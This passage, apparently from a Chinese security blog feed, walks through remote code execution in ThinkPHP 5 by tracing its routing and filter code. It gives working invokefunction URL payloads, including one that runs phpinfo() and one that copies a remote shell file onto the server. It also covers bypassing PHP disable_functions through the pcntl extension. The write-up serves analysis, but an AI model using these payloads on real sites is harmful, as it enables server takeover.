GetShell</h1><p>俗话说，三个臭皮匠顶一个诸葛亮，求助师傅们后，给出了解决的办法</p><ol><li>Noel 师傅的解决方法及分析：</li></ol><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2020.02.14/5.png"></p><p>Request.php的filtervalue函数下存在call_user_func,根据Payload，跟踪下流程</p><p>首先会进入App.php的Run方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params">Request $request = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        ………………………………</span><br><span class="line">        <span class="comment">// 未设置调度信息则进行 URL 路由检测</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($dispatch)) &#123;</span><br><span class="line">            <span class="comment">/*执行当前类的routeCheck方法,获取调度信息,如访问index模块下index控制器里的index方法,则</span></span><br><span class="line"><span class="comment">                $dispatch = array(2) &#123; [&quot;type&quot;]=&gt; string(6) &quot;module&quot;</span></span><br><span class="line"><span class="comment">                    [&quot;module&quot;]=&gt; array(3) &#123;</span></span><br><span class="line"><span class="comment">                        [0]=&gt; string(5) &quot;index&quot; [1]=&gt; string(5) &quot;index&quot; [2]=&gt; string(5) &quot;index&quot; &#125; &#125;</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">            $dispatch = <span class="built_in">self</span>::routeCheck($request, $config);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录当前调度信息 将获取的调度信息,即模块,控制器,方法名存入Request类的dispatch属性中</span></span><br><span class="line">        $request-&gt;dispatch($dispatch);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录路由和请求信息 调式模式,在\application\config.php 参数app_debug可配置</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">self</span>::$debug) &#123;</span><br><span class="line">            Log::record(<span class="string">&#x27;[ ROUTE ] &#x27;</span> . var_export($dispatch, <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">            Log::record(<span class="string">&#x27;[ HEADER ] &#x27;</span> . var_export($request-&gt;header(), <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">            Log::record(<span class="string">&#x27;[ PARAM ] &#x27;</span> . var_export($request-&gt;param(), <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ………………………………</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们主要关注routeCheck和param两个函数，先看routeCheck</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span>(<span class="params">$request, <span class="keyword">array</span> $config</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $path   = $request-&gt;path();</span><br><span class="line">        $depr   = $config[<span class="string">&#x27;pathinfo_depr&#x27;</span>];</span><br><span class="line">        $result = <span class="literal">false</span>;</span><br><span class="line">      ………………………………</span><br><span class="line">        <span class="comment">// 路由检测（根据路由定义返回不同的URL调度）</span></span><br><span class="line">        $result = Route::check($request, $path, $depr, $config[<span class="string">&#x27;url_domain_deploy&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>主要是将请求参数什么的传入，经过check后就基本上都处理好了</p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2020.02.14/6.png"></p><p>在调试模式开启的情况下可以进入param函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;param)) &#123;</span><br><span class="line">            $method = <span class="keyword">$this</span>-&gt;method(<span class="literal">true</span>);</span><br><span class="line">    ......</span><br><span class="line">        <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;get(<span class="literal">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="literal">false</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p> 跟进input函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params">$data = [], $name = <span class="string">&#x27;&#x27;</span>, $default = <span class="literal">null</span>, $filter = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">      $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line">      <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">          array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], $filter);</span><br><span class="line">          reset($data);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>getFilter取出filter的值，在这里也就是assert</p><p>array_walk_recursive</p><blockquote><p>array_walk_recursive() 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。该函数与 <a href="https://www.runoob.com/php/func-array-walk.html">array_walk()</a> 函数的不同在于可以操作更深的数组（一个数组中包含另一个数组）。</p></blockquote><p>及对$data的每一个元素应用filterValue函数，跟进filterValue</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterValue</span>(<span class="params">&amp;$value, $key, $filters</span>)</span>&#123;</span><br><span class="line"> ......   </span><br><span class="line"><span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">                <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">                $value = call_user_func($filter, $value);</span><br><span class="line">            &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>铳梦师傅的解决方法及分析：</li></ol><p>payload参考：</p><p>来自：<a href="https://xz.aliyun.com/t/3570#toc-4">https://xz.aliyun.com/t/3570#toc-4</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;assert&amp;vars[1][]&#x3D;phpinfo()</span><br></pre></td></tr></table></figure><p>执行phpinfo（这里注意看 ?s= 后的参数）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;127.0.0.1&#x2F;?s&#x3D;..&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;assert&amp;vars[1][]&#x3D;phpinfo()</span><br></pre></td></tr></table></figure><p>拿shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;127.0.0.1&#x2F;?s&#x3D;..&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;assert&amp;vars[1][]&#x3D;copy(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;shell.txt&#39;,&#39;test.php&#39;)</span><br></pre></td></tr></table></figure><p>为什么要这么构造呢，给出当前的目录情况以及分析：</p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2020.02.14/7.png"></p><p>Route.php的parseUrl函数会对url进行处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span>(<span class="params">$url, $depr = <span class="string">&#x27;/&#x27;</span>, $autoSearch = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        .......</span><br><span class="line">        $url              = str_replace($depr, <span class="string">&#x27;|&#x27;</span>, $url);</span><br><span class="line">        <span class="keyword">list</span>($path, $var) = <span class="built_in">self</span>::parseUrlPath($url);</span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先将url中的<code>/</code>替换为<code>|</code>之后是parseUrlPath将url分割</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrlPath</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="comment">// 分隔符替换 确保路由定义使用统一的分隔符</span></span><br><span class="line">     $url = str_replace(<span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, $url);</span><br><span class="line">     $url = trim($url, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">     $var = [];</span><br><span class="line">     <span class="keyword">if</span> (<span class="literal">false</span> !== strpos($url, <span class="string">&#x27;?&#x27;</span>)) &#123;</span><br><span class="line">......</span><br><span class="line">         ......</span><br><span class="line">     &#125; <span class="keyword">elseif</span> (strpos($url, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">         <span class="comment">// [模块/控制器/操作]</span></span><br><span class="line">         $path = explode(<span class="string">&#x27;/&#x27;</span>, $url);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         ......</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> [$path, $var];</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>得到如下三部分</p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2020.02.14/8.png"></p><p>模块加载时Loder.php下的parseName函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseName</span>(<span class="params">$name, $type = <span class="number">0</span>, $ucfirst = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($type) &#123;</span><br><span class="line">        $name = preg_replace_callback(<span class="string">&#x27;/_([a-zA-Z])/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$match</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> strtoupper($match[<span class="number">1</span>]);</span><br><span class="line">        &#125;, $name);</span><br><span class="line">        <span class="keyword">return</span> $ucfirst ? ucfirst($name) : lcfirst($name);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> strtolower(trim(preg_replace(<span class="string">&quot;/[A-Z]/&quot;</span>, <span class="string">&quot;_\\0&quot;</span>, $name), <span class="string">&quot;_&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2020.02.14/9.png"></p><p>现在就会实例化\Think\app类并执行invokefunction方法</p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2020.02.14/10.png"></p><p>所以加<code>../\</code>的原因是可以再往前跳一层</p><h1 id="0x04-bypass-disable-functions"><a href="#0x04-bypass-disable-functions" class="headerlink" title="0x04 bypass disable_functions"></a>0x04 bypass disable_functions</h1><p>查看禁用</p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2020.02.14/11.png"></p><ol><li><p>一开始没仔细看禁用的内容，直接就用了这个</p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a> </p></li></ol><p>但是发现putenv被禁用了</p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2020.02.14/12.png"></p><ol start="2"><li>换个方法，通过这篇文章</li></ol><p><a href="https://mochazz.github.io/2018/09/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%BB%95%E8%BF%87PHP%E7%9A%84disable_functions/">https://mochazz.github.io/2018/09/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%BB%95%E8%BF%87PHP%E7%9A%84disable_functions/</a></p><p>了解到利用pcntl扩展，确认系统支持</p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2020.02.14/13.png"></p><p>最终成功执行命令</p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2020.02.14/14.png"></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;文章首发无法溯源安全团队公众号&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="PHP" scheme="https://www.se7ensec.cn/tags/PHP/"/>
    
    <category term="GetShell" scheme="https://www.se7ensec.cn/tags/GetShell/"/>
    
  </entry>
  
</feed>
